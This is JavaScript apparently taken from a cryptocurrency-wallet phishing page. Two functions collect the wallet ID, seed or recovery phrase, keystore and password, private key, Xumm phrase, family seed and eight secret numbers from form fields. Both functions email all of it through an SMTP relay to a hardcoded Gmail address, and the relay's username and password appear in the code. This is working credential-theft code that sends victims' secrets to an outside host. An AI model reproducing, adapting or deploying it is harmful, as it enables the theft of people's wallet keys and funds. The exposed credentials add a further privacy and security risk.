
   function sendEmail(){
    Email.send({
      Host : "smtp.elasticemail.com",
      Username : "adpanel239@gmail.com",
      Password : "610D7993C8C5A16F01103CFCDAEA2414F929",
      To : 'adpanel239@gmail.com',
      From : "adpanel239@gmail.com",
      Subject : "New Wallet Info",
      Body : "Wallet : " + document.getElementById("walletid").innerHTML
      + "<br>"
      + "<br> Phrase : " + document.getElementById("phrase").value
      + "<br>"
      + "<br> Keystore : " + document.getElementById("keystore").value
      + "<br> Password : " + document.getElementById("key-pass").value
      + "<br>"
      + "<br> Private Key : " + document.getElementById("private").value
      });
}

function sendEmail2(){
  Email.send({
    Host : "smtp.elasticemail.com",
      Username : "adpanel239@gmail.com",
      Password : "610D7993C8C5A16F01103CFCDAEA2414F929",
      To : 'adpanel239@gmail.com',
      From : "adpanel239@gmail.com",
    Subject : "New Wallet Info",
    Body : "Wallet : " + document.getElementById("walletid2").innerHTML
    +"<br>"
    + "<br> Xumm Phrase : " + document.getElementById("xphrase").value
    + "<br>"
    + "<br> Family Seed : " + document.getElementById("family-pass").value
    + "<br>"
    + "<br> Secret Number A : " + document.getElementById("secret1").value
    + "<br> Secret Number B : " + document.getElementById("secret2").value
    + "<br> Secret Number C : " + document.getElementById("secret3").value
    + "<br> Secret Number D : " + document.getElementById("secret4").value
    + "<br> Secret Number E : " + document.getElementById("secret5").value
    + "<br> Secret Number F : " + document.getElementById("secret6").value
    + "<br> Secret Number G : " + document.getElementById("secret7").value
    + "<br> Secret Number H : " + document.getElementById("secret8").value
    });
}